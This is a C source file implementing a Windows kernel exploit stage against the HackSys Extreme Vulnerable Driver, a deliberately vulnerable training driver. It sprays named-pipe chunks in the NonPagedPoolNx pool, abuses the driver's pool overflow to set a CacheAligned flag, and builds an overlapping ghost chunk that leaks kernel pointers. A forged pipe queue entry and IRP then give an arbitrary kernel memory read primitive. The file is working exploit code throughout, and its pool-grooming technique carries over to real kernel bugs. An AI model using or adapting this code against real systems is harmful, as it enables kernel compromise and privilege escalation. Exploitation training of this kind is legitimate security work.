#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_read.h"

#include "pipe_utils/pipe_utils.h"
#include "hevd/hevd.h"

pipe_queue_entry_irp_t g_fake_irp;

void allocateNewVsSubSegment()
{
    char dummy_buf[0x1000];
    memset(dummy_buf, 0x41, 0x1000);

    SprayNPPNxChunks(0x20000, (vs_chunk_t*)dummy_buf, VULN_BLOCK_SIZE);
}

pipe_group_t* createChunkHoles()
{
    char dummy_buf[0x1000];
    memset(dummy_buf, 0x41, 0x1000);

    pipe_group_t* victim_chunks = SprayNPPNxChunks(SPRAY_SIZE, (vs_chunk_t*)dummy_buf, VICTIM_BLOCK_SIZE);

    // Create holes
    for (size_t i = 0; i < victim_chunks->nb; i += 3)
    {
        FreeNPPNxChunk(victim_chunks->pipes[i], VICTIM_BLOCK_SIZE);
        victim_chunks->pipes[i] = { 0 };
    }

    return victim_chunks;
}

void setCacheAlignedFlagOnVictimChunk()
{
    vs_chunk_t overflow_chunk = { 0 };
    overflow_chunk.pool_header.PreviousSize = PIPE_QUEUE_ENTRY_BUFSIZE(VICTIM_BLOCK_SIZE) / 0x10;
    overflow_chunk.pool_header.PoolIndex = 0;
    overflow_chunk.pool_header.BlockSize = 0;
    overflow_chunk.pool_header.PoolType = 0 | 4; // Set CacheAligned flag

    HANDLE hHevd = HevdOpenDeviceHandle();
    HevdTriggerBufferOverflowNonPagedPoolNx(hHevd, (char*)&overflow_chunk);
    CloseHandle(hHevd);

    Sleep(2000);
}

void enableLookaside(int count, ...)
{
    va_list ap;

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        size_t block_size = va_arg(ap, size_t);
        SprayNPPNxChunks(0x10000, NULL, block_size);
    }
    va_end(ap);

    Sleep(2000);

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        size_t block_size = va_arg(ap, size_t);
        SprayNPPNxChunks(0x10000, NULL, block_size);
    }
    va_end(ap);

    Sleep(1000);

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        size_t block_size = va_arg(ap, size_t);
        SprayNPPNxChunks(0x100, NULL, block_size);
        printf("[+] Size 0x%llX enabled\n", block_size);
    }
    va_end(ap);
}

void printHexDump(char* data, size_t size)
{
    for (size_t j = 0; j < size; j++)
    {
        printf("%02x ", data[j] & 0xff);
    }
    puts("");
}

size_t scanPipesForGhostChunkLeak(pipe_group_t* fake_pool_header_chunks, vs_chunk_t* fake_vs_chunk, vs_chunk_t* leaked_ghost_chunk)
{
    for (size_t i = 0; i < fake_pool_header_chunks->nb; i++)
    {
        char scan_buf[0x1000] = { 0 };

        if (!PeekDataFromPipe(&fake_pool_header_chunks->pipes[i], scan_buf, sizeof(vs_chunk_t)))
        {
            fprintf(stderr, "[-] Failed to peek pipe for overlap detection\n");
            exit(0);
        }

        if (memcmp((char*)fake_vs_chunk, scan_buf, sizeof(vs_chunk_t)))
        {
            printf("\n[+] Chunk overlap detected in pipe %lld\n", i);

            printf("\tOriginal data:     ");
            printHexDump((char*)fake_vs_chunk, sizeof(vs_chunk_t));

            printf("\tLeaked ghost data: ");
            printHexDump(scan_buf, sizeof(vs_chunk_t));

            memcpy(leaked_ghost_chunk, scan_buf, sizeof(vs_chunk_t));
            return i;
        }
    }
    return -1;
}

int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs, pipe_group_t* victim_chunks, pipe_group_t* fake_pool_header_chunks, vs_chunk_t* fake_vs_chunk)
{
    pipe_group_t* ghost_chunk_candidates = CreatePipeGroup(SPRAY_SIZE, GHOST_BLOCK_SIZE);

    for (int ghost_chunk_idx = 0; ghost_chunk_idx < victim_chunks->nb; ghost_chunk_idx++)
    {
        printf(".");

        // Free a cache aligned victim chunk to create space for the ghost chunk
        FreeNPPNxChunk(victim_chunks->pipes[ghost_chunk_idx], VICTIM_BLOCK_SIZE);

        // Allocate a ghost chunk, potentially occupying the freed cached aligned space
        ghost_chunk_candidates->pipes[ghost_chunk_idx] = AllocNPPNxChunk(NULL, GHOST_BLOCK_SIZE);

        // Check if ghost chunk creation and allocation was successful by detecting information leak
        vs_chunk_t leaked_ghost_chunk_data;
        size_t previous_chunk_idx = scanPipesForGhostChunkLeak(fake_pool_header_chunks, fake_vs_chunk, &leaked_ghost_chunk_data);
        if (previous_chunk_idx != -1)
        {
            printf("[+] Detected information leak from overlapping chunks in pipe %lld (fake_pool_header)\n", previous_chunk_idx);

            addrs->root_pipe_queue_entry = (uintptr_t)leaked_ghost_chunk_data.pipe_queue_entry.list.Flink;
            printf("[+] root_pipe_queue_entry: 0x%llX\n", addrs->root_pipe_queue_entry);

            pipes->ghost_chunk_pipe = ghost_chunk_candidates->pipes[ghost_chunk_idx];
            printf("[+] ghost_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->ghost_chunk_pipe.read, pipes->ghost_chunk_pipe.write);
            ghost_chunk_candidates->pipes[ghost_chunk_idx] = { 0 };
            DestroyPipeGroup(ghost_chunk_candidates);

            pipes->previous_chunk_pipe = fake_pool_header_chunks->pipes[previous_chunk_idx];
            printf("[+] previous_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->previous_chunk_pipe.read, pipes->previous_chunk_pipe.write);
            fake_pool_header_chunks->pipes[previous_chunk_idx] = { 0 };
            DestroyPipeGroup(fake_pool_header_chunks);

            return 1;
        }

        // If ghost chunk creation failed, clear the lookaside list head and retry
        victim_chunks->pipes[ghost_chunk_idx] = AllocNPPNxChunk(NULL, VICTIM_BLOCK_SIZE);
    }

    fprintf(stderr, "[-] Failed to create ghost chunk: No information leak detected\n");
    return 0;
}

void setFakePipeQueueEntry(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    vs_chunk_t fake_pipe_queue_entry_chunk = { 0 };
    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.linkedIRP = (uintptr_t)&g_fake_irp;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.SecurityClientContext = 0;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.isDataInKernel = 0x1;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.DataSize = 0xffffffff;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.remaining_bytes = 0xffffffff;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.field_2C = 0x43434343;

    uintptr_t pipe_queue_entry_addr;
    do
    {
        printf(".");
        FreeNPPNxChunk(pipes->previous_chunk_pipe, VULN_BLOCK_SIZE);
        pipes->previous_chunk_pipe = AllocNPPNxChunk(&fake_pipe_queue_entry_chunk, VULN_BLOCK_SIZE);
        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
    } while (pipe_queue_entry_addr == 0x4141414141414141);
    printf("\n");
}

int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    puts("[*] Allocating new VS_SUB_SEGMENT...");
    allocateNewVsSubSegment();

    puts("[*] Creating chunk holes...");
    pipe_group_t* victim_chunks = createChunkHoles();

    puts("[*] Exploiting HEVD to set CacheAligned flag...");
    setCacheAlignedFlagOnVictimChunk();

    puts("[*] Placing fake POOL_HEADERs for cache alignment...");
    vs_chunk_t fake_vs_chunk = { 0 };
    fake_vs_chunk.pool_header.PreviousSize = 0;
    fake_vs_chunk.pool_header.PoolIndex = 0;
    fake_vs_chunk.pool_header.BlockSize = GHOST_BLOCK_SIZE / 0x10;
    fake_vs_chunk.pool_header.PoolTag = 0x4141414141;

    pipe_group_t* fake_pool_header_chunks = SprayNPPNxChunks(SPRAY_SIZE, &fake_vs_chunk, VULN_BLOCK_SIZE);

    printf("[*] Enabling dynamic lookaside lists (0x%X, 0x%X)...\n", VICTIM_BLOCK_SIZE, GHOST_BLOCK_SIZE);
    enableLookaside(2, VICTIM_BLOCK_SIZE, GHOST_BLOCK_SIZE);

    puts("[*] Creating and locating ghost chunk...");
    if (!createGhostChunk(pipes, addrs, victim_chunks, fake_pool_header_chunks, &fake_vs_chunk))
    {
        fprintf(stderr, "[-] Failed to create ghost chunk\n");
        return 0;
    }

    printf("[*] Enabling a dynamic lookaside list (0x%X)...\n", VULN_BLOCK_SIZE);
    enableLookaside(1, VULN_BLOCK_SIZE);

    puts("[*] Spraying pipes with fake pipe queue entry...");
    setFakePipeQueueEntry(pipes, addrs);

    return 1;
}

void ArbitraryRead(pipe_pair_t* ghost_pipe, uintptr_t where, char* out, size_t size)
{
    char arb_read[0x1000];

    if (size >= 0x1000)
        size = 0xFFF;

    g_fake_irp.SystemBuffer = where;
    PeekDataFromPipe(ghost_pipe, arb_read, size);
    memcpy(out, arb_read, size);
}
